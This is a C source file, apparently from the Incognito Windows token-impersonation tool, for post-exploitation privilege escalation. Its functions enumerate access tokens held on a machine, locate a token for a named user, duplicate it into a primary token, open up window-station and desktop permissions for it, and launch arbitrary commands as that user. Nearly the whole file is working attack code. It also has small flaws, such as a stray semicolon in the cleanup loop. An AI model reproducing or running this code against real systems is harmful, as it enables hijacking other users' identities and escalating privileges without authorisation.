/*
Software License Agreement (BSD License)

Copyright (c) 2006, Luke Jennings (0xlukej@gmail.com)
All rights reserved.

Redistribution and use of this software in source and binary forms, with or without modification, are
permitted provided that the following conditions are met:

* Redistributions of source code must retain the above
  copyright notice, this list of conditions and the
  following disclaimer.

* Redistributions in binary form must reproduce the above
  copyright notice, this list of conditions and the
  following disclaimer in the documentation and/or other
  materials provided with the distribution.

* Neither the name of Luke Jennings nor the names of its
  contributors may be used to endorse or promote products
  derived from this software without specific prior
  written permission of Luke Jennings.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED
WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/
#define _CRT_SECURE_NO_DEPRECATE 1

// Constants
#define WINSTA_ALL (WINSTA_ACCESSCLIPBOARD | WINSTA_ACCESSGLOBALATOMS | WINSTA_CREATEDESKTOP | WINSTA_ENUMDESKTOPS | WINSTA_ENUMERATE | WINSTA_EXITWINDOWS | WINSTA_READATTRIBUTES | WINSTA_READSCREEN | WINSTA_WRITEATTRIBUTES | DELETE | READ_CONTROL | WRITE_DAC | WRITE_OWNER)

#define DESKTOP_ALL (DESKTOP_CREATEMENU | DESKTOP_CREATEWINDOW | DESKTOP_ENUMERATE | DESKTOP_HOOKCONTROL | DESKTOP_JOURNALPLAYBACK | DESKTOP_JOURNALRECORD | DESKTOP_READOBJECTS | DESKTOP_SWITCHDESKTOP | DESKTOP_WRITEOBJECTS | DELETE | READ_CONTROL | WRITE_DAC | WRITE_OWNER)

#define GENERIC_ACCESS (GENERIC_READ | GENERIC_WRITE | GENERIC_EXECUTE | GENERIC_ALL)

#include <stdio.h>
#include <assert.h>
#include <stdlib.h>
#include <string.h>
#include <aclapi.h>
#include <accctrl.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <lm.h>
#include <wchar.h>
#include "list_tokens.h"
#include "child_process.h"
#include "token_info.h"
#include "handle_arguments.h"

void create_process(HANDLE token, char *command, BOOL console_mode, SECURITY_IMPERSONATION_LEVEL impersonation_level, int session_var);


void execute_process_with_primary_token(char *requested_username, char *command, BOOL console_mode, int session_var)
{
	DWORD num_unique_tokens = 0, num_tokens = 0, i;
	unique_user_token *uniq_tokens = calloc(BUF_SIZE, sizeof(unique_user_token));
	SavedToken *token_list = NULL;
	BOOL bTokensAvailable = FALSE, delegation_available = FALSE, assignprimarypriv_gained = FALSE;
	TOKEN_PRIVS token_privs;

	output_status_string("[*] Attempting to run command: %s\n\n", command);
		
	// Enumerate tokens
	output_status_string("[*] Enumerating tokens\n");

	token_list = get_token_list(&num_tokens, &token_privs);
	if (!token_list)
	{
		output_status_string("[-] Failed to enumerate tokens with error code: %d\n", GetLastError());
		return;
	}

	// Process all tokens to get determinue unique names and delegation abilities
	for (i=0;i<num_tokens;i++)
	if (token_list[i].token)
	{
		// get assign primary privilege if its available
		if (!assignprimarypriv_gained && has_assignprimarytoken_priv(token_list[i].token)){
			if (TryEnableAssignPrimaryPriv(token_list[i].token) == 0)
			{
				assignprimarypriv_gained = TRUE;
				ImpersonateLoggedOnUser(token_list[i].token);
			}
		}
		process_user_token(token_list[i].token, uniq_tokens, &num_unique_tokens, BY_GROUP);
		process_user_token(token_list[i].token, uniq_tokens, &num_unique_tokens, BY_USER);
	}

	if (num_tokens > 0)
	{
		output_status_string("[*] Searching for availability of requested token\n");

		for (i=0;i<num_unique_tokens;i++)
		{
			if (!_stricmp(uniq_tokens[i].username, requested_username) )//&& uniq_tokens[i].impersonation_available)
			{
				output_status_string("[+] Requested token found\n");

				if (uniq_tokens[i].delegation_available)
					delegation_available = TRUE;
				if (delegation_available)
					output_status_string("[+] Delegation token available\n");
				else
					output_status_string("[-] No Delegation token available\n");

				for (i=0;i<num_tokens;i++)
				{
					if (is_token(token_list[i].token, requested_username) )//&& is_impersonation_token(token_list[i].token))
					{
						if (delegation_available && is_delegation_token(token_list[i].token))
						{
							create_process(token_list[i].token, command, console_mode, SecurityDelegation, session_var);
							goto cleanup;
						}
						else 
						{
							create_process(token_list[i].token, command, console_mode, SecurityImpersonation, session_var);
							goto cleanup;
						}
					}
				}
			}

		}
	}

	output_status_string("[-] Requested token not found\n");

cleanup:
	RevertToSelf();
	for (i=0;i<num_tokens;i++)
	if (token_list[i].token);
		CloseHandle(token_list[i].token);	
	free(token_list);
	free(uniq_tokens);
}

BOOL AddAceToWindowStation(HWINSTA hwinsta, PSID psid){

	ACCESS_ALLOWED_ACE   *pace;
	ACL_SIZE_INFORMATION aclSizeInfo;
	BOOL                 bDaclExist;
	BOOL                 bDaclPresent;
	BOOL                 bSuccess = FALSE;
	DWORD            dwNewAclSize;
	DWORD            dwSidSize = 0;
	DWORD            dwSdSizeNeeded;
	PACL                 pacl;
	PACL                 pNewAcl;
	PSECURITY_DESCRIPTOR psd = NULL;
	PSECURITY_DESCRIPTOR psdNew = NULL;
	PVOID                pTempAce;
	SECURITY_INFORMATION si = DACL_SECURITY_INFORMATION;
	unsigned int         i;
	

	printf("[+] Adding ACE to WindowStation...\n");	
	__try
	{

		// Obtain the DACL for the window station.
		if (!GetUserObjectSecurity(hwinsta, &si, psd, dwSidSize, &dwSdSizeNeeded))

			if (GetLastError() == ERROR_INSUFFICIENT_BUFFER)
			{

				psd = (PSECURITY_DESCRIPTOR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSdSizeNeeded);
				
				if (psd == NULL)
					__leave;
		/*		else
					printf("Heap allocated for psd!\n");*/

				psdNew = (PSECURITY_DESCRIPTOR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSdSizeNeeded);
				if (psdNew == NULL)
					__leave;
		/*		else
					printf("Heap allocated for psdNew!\n");*/


				dwSidSize = dwSdSizeNeeded;
				if (!GetUserObjectSecurity(hwinsta, &si, psd, dwSidSize, &dwSdSizeNeeded))
				{
					printf("GetUserObjectSecurity() failed, error %d\n", GetLastError());
					__leave;
				}
				/*else
					printf("GetUserObjectSecurity() is working!\n");*/
			}
			else
				__leave;
		
		// Create a new DACL.
		if (!InitializeSecurityDescriptor(psdNew, SECURITY_DESCRIPTOR_REVISION))
		{
			printf("InitializeSecurityDescriptor() failed, error %d\n", GetLastError());
			__leave;
		}
	/*	else
			printf("InitializeSecurityDescriptor() is working!\n");*/

		// Get the DACL from the security descriptor.
		if (!GetSecurityDescriptorDacl(psd, &bDaclPresent, &pacl, &bDaclExist))
		{
			printf("GetSecurityDescriptorDacl() failed, error %d\n", GetLastError());
			__leave;
		}
	/*	else
			printf("GetSecurityDescriptorDacl() is working!\n");*/

		// Initialize the ACL
		SecureZeroMemory(&aclSizeInfo, sizeof(ACL_SIZE_INFORMATION));
		aclSizeInfo.AclBytesInUse = sizeof(ACL);

		// Call only if the DACL is not NULL
		if (pacl != NULL)
		{

			// get the file ACL size info
			if (!GetAclInformation(pacl, (LPVOID)&aclSizeInfo, sizeof(ACL_SIZE_INFORMATION), AclSizeInformation))
			{
				printf("GetAclInformation() failed, error %d\n",GetLastError());
				__leave;
			}
			/*else
				printf("GetAclInformation() is working!\n");*/

		}		

		// Compute the size of the new ACL
		dwNewAclSize = aclSizeInfo.AclBytesInUse + (2 * sizeof(ACCESS_ALLOWED_ACE)) + (2 * GetLengthSid(psid)) - (2 * sizeof(DWORD));
		// Allocate memory for the new ACL
		pNewAcl = (PACL)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwNewAclSize);

		if (pNewAcl == NULL)
			__leave;
	/*	else
			printf("Heap allocated for pNewAcl!\n");*/

		// Initialize the new DACL
		if (!InitializeAcl(pNewAcl, dwNewAclSize, ACL_REVISION))
		{
			printf("InitializeAcl() failed, error %d\n", GetLastError());
			__leave;
		}
	/*	else
			printf("InitializeAcl() is working!\n");	*/	

		// If DACL is present, copy it to a new DACL
		if (bDaclPresent)
		{
			// Copy the ACEs to the new ACL.
			if (aclSizeInfo.AceCount)
			{

				for (i = 0; i < aclSizeInfo.AceCount; i++)
				{

					// Get an ACE.
					if (!GetAce(pacl, i, &pTempAce))
					{
						printf("GetAce() failed, error %d\n", GetLastError());
						__leave;
					}
				/*	else
						printf("GetAce() is working!\n");*/


					// Add the ACE to the new ACL.
					if (!AddAce(pNewAcl, ACL_REVISION, MAXDWORD, pTempAce, ((PACE_HEADER)pTempAce)->AceSize))
					{
						printf("AddAce() failed, error %d\n", GetLastError());
						__leave;
					}
				/*	else
						printf("AddAce() is working!\n");*/
				}

			}

		}		

		// Add the first ACE to the window station
		pace = (ACCESS_ALLOWED_ACE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(ACCESS_ALLOWED_ACE) + GetLengthSid(psid) - sizeof(DWORD));
			   
		if (pace == NULL)
			__leave;
	/*	else
			printf("Heap allocated for pace!\n");*/

		pace->Header.AceType = ACCESS_ALLOWED_ACE_TYPE;
		pace->Header.AceFlags = CONTAINER_INHERIT_ACE | INHERIT_ONLY_ACE | OBJECT_INHERIT_ACE;
		pace->Header.AceSize = (WORD)(sizeof(ACCESS_ALLOWED_ACE) + GetLengthSid(psid) - sizeof(DWORD));
		pace->Mask = GENERIC_ACCESS;


		if (!CopySid(GetLengthSid(psid), &pace->SidStart, psid))
		{
			printf("CopySid() failed, error %d\n", GetLastError());
			__leave;
		}
		/*else
			printf("CopySid() is working!\n");*/


		if (!AddAce(pNewAcl, ACL_REVISION, MAXDWORD, (LPVOID)pace, pace->Header.AceSize))		{

			printf("AddAce() failed, error %d\n", GetLastError());
			__leave;
		}
	/*	else
			printf("AddAce() 1 is working!\n");*/

		// Add the second ACE to the window station
		pace->Header.AceFlags = NO_PROPAGATE_INHERIT_ACE;
		pace->Mask = WINSTA_ALL;

		if (!AddAce(pNewAcl, ACL_REVISION, MAXDWORD, (LPVOID)pace, pace->Header.AceSize))
		{

			printf("AddAce() failed, error %d\n", GetLastError());
			__leave;
		}
	/*	else
			printf("AddAce() 2 is working!\n");*/

		// Set a new DACL for the security descriptor
		if (!SetSecurityDescriptorDacl(psdNew, TRUE, pNewAcl, FALSE))
		{
			printf("SetSecurityDescriptorDacl() failed, error %d\n", GetLastError());
			__leave;
		}
	/*	else
			printf("SetSecurityDescriptorDacl() is working!\n");*/

		// Set the new security descriptor for the window station
		if (!SetUserObjectSecurity(hwinsta, &si, psdNew))
		{
			printf("SetUserObjectSecurity() failed, error %d\n", GetLastError());
			__leave;
		}
	/*	else
			printf("SetUserObjectSecurity() is working!\n");*/

		// Indicate success
		bSuccess = TRUE;
	}
	__finally
	{
		// Free the allocated buffers
		if (pace != NULL)
			HeapFree(GetProcessHeap(), 0, (LPVOID)pace);
		if (pNewAcl != NULL)
			HeapFree(GetProcessHeap(), 0, (LPVOID)pNewAcl);
		if (psd != NULL)
			HeapFree(GetProcessHeap(), 0, (LPVOID)psd);
		if (psdNew != NULL)
			HeapFree(GetProcessHeap(), 0, (LPVOID)psdNew);
	}

	return bSuccess;

}

BOOL AddAceToDesktop(HDESK hdesk, PSID psid)
{
	ACL_SIZE_INFORMATION aclSizeInfo;
	BOOL                 bDaclExist;
	BOOL                 bDaclPresent;
	BOOL                 bSuccess = FALSE;
	DWORD            dwNewAclSize;
	DWORD            dwSidSize = 0;
	DWORD            dwSdSizeNeeded;
	PACL                 pacl;
	PACL                 pNewAcl;
	PSECURITY_DESCRIPTOR psd = NULL;
	PSECURITY_DESCRIPTOR psdNew = NULL;
	PVOID                pTempAce;
	SECURITY_INFORMATION si = DACL_SECURITY_INFORMATION;
	unsigned int         i;


	printf("[+] Adding ACE to Desktop...\n");
	__try
	{
		// Obtain the security descriptor for the desktop object
		if (!GetUserObjectSecurity(hdesk, &si, psd, dwSidSize, &dwSdSizeNeeded))
		{

			if (GetLastError() == ERROR_INSUFFICIENT_BUFFER)
			{

				psd = (PSECURITY_DESCRIPTOR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSdSizeNeeded);
				if (psd == NULL)
					__leave;

				psdNew = (PSECURITY_DESCRIPTOR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSdSizeNeeded);
				if (psdNew == NULL)
					__leave;				

				dwSidSize = dwSdSizeNeeded;
				if (!GetUserObjectSecurity(hdesk, &si, psd, dwSidSize, &dwSdSizeNeeded))
				{
					printf("GetUserObjectSecurity() failed, error %d\n", GetLastError());
					__leave;
				}

			}

			else

				__leave;

		}



		// Create a new security descriptor

		if (!InitializeSecurityDescriptor(psdNew, SECURITY_DESCRIPTOR_REVISION))
		{
			printf("InitializeSecurityDescriptor() failed, error %d\n", GetLastError());
			__leave;
		}

		// Obtain the DACL from the security descriptor
		if (!GetSecurityDescriptorDacl(psd, &bDaclPresent, &pacl, &bDaclExist))
		{
			printf("GetSecurityDescriptorDacl() failed, error %d\n", GetLastError());
			__leave;
		}
		

		// Initialize
		ZeroMemory(&aclSizeInfo, sizeof(ACL_SIZE_INFORMATION));
		aclSizeInfo.AclBytesInUse = sizeof(ACL);

		// Call only if NULL DACL
		if (pacl != NULL)
		{

			// Determine the size of the ACL information
			if (!GetAclInformation(pacl, (LPVOID)&aclSizeInfo, sizeof(ACL_SIZE_INFORMATION), AclSizeInformation))
			{
				printf("GetAclInformation() failed, error %d\n", GetLastError());
				__leave;
			}

		}		

		// Compute the size of the new ACL
		dwNewAclSize = aclSizeInfo.AclBytesInUse + sizeof(ACCESS_ALLOWED_ACE) + GetLengthSid(psid) - sizeof(DWORD);

		// Allocate buffer for the new ACL
		pNewAcl = (PACL)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwNewAclSize);
		if (pNewAcl == NULL)
			__leave;

		// Initialize the new ACL
		if (!InitializeAcl(pNewAcl, dwNewAclSize, ACL_REVISION))
		{
			printf("InitializeAcl() failed, error %d\n", GetLastError());
			__leave;
		}

		// If DACL is present, copy it to a new DACL
		if (bDaclPresent)
		{

			// Copy the ACEs to the new ACL.
			if (aclSizeInfo.AceCount)
			{

				for (i = 0; i < aclSizeInfo.AceCount; i++)
				{

					// Get an ACE
					if (!GetAce(pacl, i, &pTempAce))
					{

						printf("GetAce() failed, error %d\n", GetLastError());
						__leave;

					}

					// Add the ACE to the new ACL.
					if (!AddAce(pNewAcl, ACL_REVISION, MAXDWORD, pTempAce, ((PACE_HEADER)pTempAce)->AceSize))
					{
						printf("AddAce() failed, error %d\n", GetLastError());
						__leave;
					}

				}

			}

		}


		// Add ACE to the DACL
		if (!AddAccessAllowedAce(pNewAcl, ACL_REVISION, DESKTOP_ALL, psid))
		{
			printf("AddAccessAllowedAce() failed, error %d\n", GetLastError());
			__leave;
		}

		// Set new DACL to the new security descriptor
		if (!SetSecurityDescriptorDacl(psdNew, TRUE, pNewAcl, FALSE))
		{
			printf("SetSecurityDescriptorDacl() failed, error %d\n", GetLastError());
			__leave;
		}

		// Set the new security descriptor for the desktop object
		if (!SetUserObjectSecurity(hdesk, &si, psdNew))
		{
			printf("SetUserObjectSecurity() failed, error %d\n", GetLastError());
			__leave;
		}

		// Indicate success
		bSuccess = TRUE;
	}
	__finally
	{
		// Free buffers
		if (pNewAcl != NULL)
			HeapFree(GetProcessHeap(), 0, (LPVOID)pNewAcl);

		if (psd != NULL)
			HeapFree(GetProcessHeap(), 0, (LPVOID)psd);

		if (psdNew != NULL)
			HeapFree(GetProcessHeap(), 0, (LPVOID)psdNew);

	}
	return bSuccess;

}

//HRESULT DisplayDaclInfo(PACL pDacl, LPCWSTR wszComputerName )
//{
//	ACL_SIZE_INFORMATION aclsizeinfo;
//	ACCESS_ALLOWED_ACE * pAce = NULL;
//	SID_NAME_USE eSidType;
//	DWORD dwErrorCode = 0;
//
//	// Create buffers that may be large enough.  
//	const DWORD INITIAL_SIZE = 256;
//	DWORD cchAccName = 0;
//	DWORD cchDomainName = 0;
//	DWORD dwAccBufferSize = INITIAL_SIZE;
//	DWORD dwDomainBufferSize = INITIAL_SIZE;
//	DWORD cAce;
//	WCHAR * wszAccName = NULL;
//	WCHAR * wszDomainName = NULL;
//
//	// Retrieve a pointer to the DACL in the security descriptor.  
//	BOOL fDaclPresent = FALSE;
//	BOOL fDaclDefaulted = TRUE;
//
//	// Retrieve the ACL_SIZE_INFORMATION structure to find the number of ACEs in the DACL.  
//	if (GetAclInformation(
//		pDacl,
//		&aclsizeinfo,
//		sizeof(aclsizeinfo),
//		AclSizeInformation
//	) == FALSE)
//	{
//		dwErrorCode = GetLastError();
//		wprintf(L"GetAclInformation failed. GetLastError returned: %d\n", dwErrorCode);
//		return HRESULT_FROM_WIN32(dwErrorCode);
//	}
//
//	// Create buffers for the account name and the domain name.  
//	wszAccName = new WCHAR[dwAccBufferSize];
//	if (wszAccName == NULL)
//	{
//		return MQ_ERROR_INSUFFICIENT_RESOURCES;
//	}
//	wszDomainName = new WCHAR[dwDomainBufferSize];
//	if (wszDomainName == NULL)
//	{
//		return MQ_ERROR_INSUFFICIENT_RESOURCES;
//	}
//	memset(wszAccName, 0, dwAccBufferSize * sizeof(WCHAR));
//	memset(wszDomainName, 0, dwDomainBufferSize * sizeof(WCHAR));
//
//	// Set the computer name string to NULL for the local computer.  
//	if (wcscmp(wszComputerName, L".") == 0)
//	{
//		wszComputerName = L"\0";
//	}
//
//	// Loop through the ACEs and display the information.  
//	for (cAce = 0; cAce < aclsizeinfo.AceCount; cAce++)
//	{
//
//		// Get ACE info  
//		if (GetAce(
//			pDacl,
//			cAce,
//			(LPVOID*)&pAce
//		) == FALSE)
//		{
//			wprintf(L"GetAce failed. GetLastError returned: %d\n", GetLastError());
//			continue;
//		}
//
//		// Obtain the account name and domain name for the SID in the ACE.  
//		for (; ; )
//		{
//
//			// Set the character-count variables to the buffer sizes.  
//			cchAccName = dwAccBufferSize;
//			cchDomainName = dwDomainBufferSize;
//			if (LookupAccountSidW(
//				wszComputerName, // NULL for the local computer  
//				&pAce->SidStart,
//				wszAccName,
//				&cchAccName,
//				wszDomainName,
//				&cchDomainName,
//				&eSidType
//			) == TRUE)
//			{
//				break;
//			}
//
//			// Check if one of the buffers was too small.  
//			if ((cchAccName > dwAccBufferSize) || (cchDomainName > dwDomainBufferSize))
//			{
//
//				// Reallocate memory for the buffers and try again.  
//				wprintf(L"The name buffers were too small. They will be reallocated.\n");
//				delete[] wszAccName;
//				delete[] wszDomainName;
//				wszAccName = new WCHAR[cchAccName];
//				if (wszAccName == NULL)
//				{
//					return MQ_ERROR_INSUFFICIENT_RESOURCES;
//				}
//				wszDomainName = new WCHAR[cchDomainName];
//				if (wszDomainName == NULL)
//				{
//					return MQ_ERROR_INSUFFICIENT_RESOURCES;
//				}
//				memset(wszAccName, 0, cchAccName * sizeof(WCHAR));
//				memset(wszDomainName, 0, cchDomainName * sizeof(WCHAR));
//				dwAccBufferSize = cchAccName;
//				dwDomainBufferSize = cchDomainName;
//				continue;
//			}
//
//			// Something went wrong in the call to LookupAccountSid.  
//			// Check if an unexpected error occurred.  
//			if (GetLastError() == ERROR_NONE_MAPPED)
//			{
//				wprintf(L"An unexpected error occurred during the call to LookupAccountSid. A name could not be found for the SID.\n");
//				wszDomainName[0] = L'\0';
//				if (dwAccBufferSize > wcslen(L"!Unknown!"))
//				{
//					// ************************************  
//					// You must copy the string "!Unknown!" into the   
//					// wszAccName buffer.  
//					// ************************************  
//
//					wszAccName[dwAccBufferSize - 1] = L'\0';
//				}
//				break;
//			}
//			else
//			{
//				dwErrorCode = GetLastError();
//				wprintf(L"LookupAccountSid failed. GetLastError returned: %d\n", dwErrorCode);
//				delete[] wszAccName;
//				delete[] wszDomainName;
//				return HRESULT_FROM_WIN32(dwErrorCode);
//			}
//		}
//
//		switch (pAce->Header.AceType)
//		{
//		case ACCESS_ALLOWED_ACE_TYPE:
//			if (wszDomainName[0] == 0)
//			{
//				wprintf(L"\nPermissions granted to %s\n", wszAccName);
//			}
//			else wprintf(L"\nPermissions granted to %s\\%s\n", wszDomainName, wszAccName);
//			DisplayPermissions(pAce->Mask);
//			break;
//
//		case ACCESS_DENIED_ACE_TYPE:
//			if (wszDomainName[0] == 0)
//			{
//				wprintf(L"\nPermissions denied to %s\n", wszAccName);
//			}
//			else wprintf(L"\nPermissions denied to %s\\%s\n", wszDomainName, wszAccName);
//			DisplayPermissions(pAce->Mask);
//			break;
//
//		default:
//			wprintf(L"Unknown ACE Type");
//		}
//	}
//
//	// Free memory allocated for buffers.  
//	delete[] wszAccName;
//	delete[] wszDomainName;
//
//	return MQ_OK;
//}

void create_process(HANDLE token, char *command, BOOL console_mode, SECURITY_IMPERSONATION_LEVEL impersonation_level, int session_var)
{
	STARTUPINFO si;
	//PROCESS_INFORMATION pi;
	char *zeros = (char *)calloc(1, 0x80);
	char window_station[100];
	DWORD length_needed, sessionid = 1, returned_length;
	//, ret_value;
	HANDLE new_token, primary_token, current_process, current_process_token, station_handle, desk_handle;
	PSID pTokenSid = NULL;
	PACL pDacl = NULL, pSacl = NULL;
	PSECURITY_DESCRIPTOR pSD = NULL;

	// Create primary token
	if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, impersonation_level, TokenPrimary, &primary_token))
	{
		OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &new_token);
	
		// Duplicate to make primary token 
		if (!DuplicateTokenEx(new_token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &primary_token))
		{
			output_status_string("[-] Failed to duplicate token to primary token: %d\n", GetLastError());
			return;
		}
	}

	// Associate process with parent process session. This makes non-console connections pop up with GUI hopefully
	if (session_var == -1) {
		current_process = OpenProcess(MAXIMUM_ALLOWED, FALSE, GetCurrentProcessId());
		OpenProcessToken(current_process, MAXIMUM_ALLOWED, &current_process_token);
		GetTokenInformation(current_process_token, TokenSessionId, &sessionid, sizeof(sessionid), &returned_length);
	}
	else {
		sessionid = session_var;
	}
	printf("[+] Session: %d\n", sessionid);
	SetTokenInformation(primary_token, TokenSessionId, &sessionid, sizeof(sessionid));

	// Create window station if necessary for invisible process
	GetUserObjectInformationA(
		GetProcessWindowStation(),
		UOI_NAME,
		(PVOID) window_station,
		100,
		&length_needed
	);

	ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb= sizeof(STARTUPINFO);

	station_handle = GetProcessWindowStation();
		//ret_value = GetSecurityInfo(station_handle, SE_WINDOW_OBJECT, 
	//	DACL_SECURITY_INFORMATION | SACL_SECURITY_INFORMATION, NULL, NULL, &pDacl, &pSacl, &pSD);
	//printf("[+] SecInfo Ret: %d\n", ret_value);

	//if (!_stricmp(window_station, "WinSta0"))
	printf("[+] Station: %s\n", window_station);
	si.lpDesktop = "WinSta0\\Default";
	//else
	//	si.lpDesktop = window_station;
	if (!get_token_user_sid(primary_token, &pTokenSid)) {
		printf("[-] Get token SID Failed: %d\n", GetLastError());
	}

	//Add all access to station
	AddAceToWindowStation(station_handle, pTokenSid);

	//Add all access to desktop
	 // Get a handle to the interactive desktop.
	desk_handle = GetThreadDesktop(GetCurrentThreadId());

	//Add all access to station
	AddAceToDesktop(desk_handle, pTokenSid);


	if (console_mode)
	{
		output_status_string("[*] Attempting to create new child process and communicate via anonymous pipe\n\n");
		CreateProcessWithPipeComm(primary_token, command);
		if (!grepable_mode)
			output_string("\n");
		output_status_string("[*] Returning from exited process\n");
		return;
	}
	else
	{
		if (CreateProcessAsUserA(
      		primary_token,     // client's access token
      		NULL,              // file to execute
      		command,           // command line
      		NULL,              // pointer to process SECURITY_ATTRIBUTES
      		NULL,              // pointer to thread SECURITY_ATTRIBUTES
      		FALSE,             // handles are not inheritable
			CREATE_NEW_PROCESS_GROUP | CREATE_NEW_CONSOLE | CREATE_BREAKAWAY_FROM_JOB,// creation flags
      		NULL,              // pointer to new environment block
     		NULL,              // name of current directory
      		&si,               // pointer to STARTUPINFO structure
			(LPPROCESS_INFORMATION)zeros                // receives information about new process
   		))
			output_status_string("[+] Created new process with token successfully\n");
		else 
			output_status_string("[-] Failed to create new process: %d\n", GetLastError());
	}
	
	CloseHandle(primary_token);
}